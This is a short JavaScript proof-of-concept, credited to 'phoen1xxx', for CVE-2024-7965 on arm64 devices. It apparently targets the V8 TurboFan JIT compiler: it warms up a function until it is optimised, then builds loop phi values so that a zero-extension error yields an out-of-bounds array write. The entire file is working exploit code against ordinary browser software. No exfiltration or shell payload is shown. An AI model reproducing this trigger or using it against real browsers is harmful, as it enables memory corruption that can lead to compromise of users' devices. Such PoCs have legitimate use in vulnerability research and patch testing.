//CVE-2024-7965 PoC for arm64 devices by phoen1xxx

var arrx = new Array(150);

arrx[0] = 1.1;

var fake = new Uint32Array(10);
fake[0]= 1;
fake[1] =3;
fake[2]=2;
fake[3] = 4;
fake[4] = 5;
fake[5] = 6;
fake[6] = 7;
fake[7] = 8;
fake[8] = 9;

var tahir = 0x1;

function poc(a) {
  var oob_array = new Array(5);
  oob_array[0] = 0x500;
  let just_a_variable = fake[0];
  let another_variable3 = fake[7];
  if(a % 7 == 0)
    another_variable3 = 0xff00000000; //spray high bytes
  another_variable3 = Math.max(another_variable3,tahir);
  another_variable3 = another_variable3 >>> 0;
  var index = fake[3];
  var for_phi_modes = fake[6];
  let c = fake[1];
  //giant loop for generate cyclic graph
  for(var i =0;i<10;i++) {
    if( a % 3 == 0){
      just_a_variable = c;
    }
    if( a % 37 == 0) {
      just_a_variable = fake[2];
    }
    if( a % 11 == 0){
      just_a_variable = fake[8];
    }
    if( a % 17 == 0){
      just_a_variable = fake[5];
    }
    if( a % 19 == 0){
      just_a_variable = fake[4];
    }
    if( a % 7 == 0 && i>=5){
      for_phi_modes = just_a_variable;
      just_a_variable = another_variable3;
    }
    if(i>=6){
      for(let j=0;j<5;j++){
        if(a % 5 == 0) {
          index = for_phi_modes;
          oob_array[index] = 0x500; //zero extends before getting value
         
        }
      }
    }
    for_phi_modes = c;
    c = just_a_variable;
  }
  //zero extend
  return [index,BigInt(just_a_variable)];
}

for(let i = 2; i<0x500;i++) {
  poc(i); //compile using turbofan
}

poc(7*5);
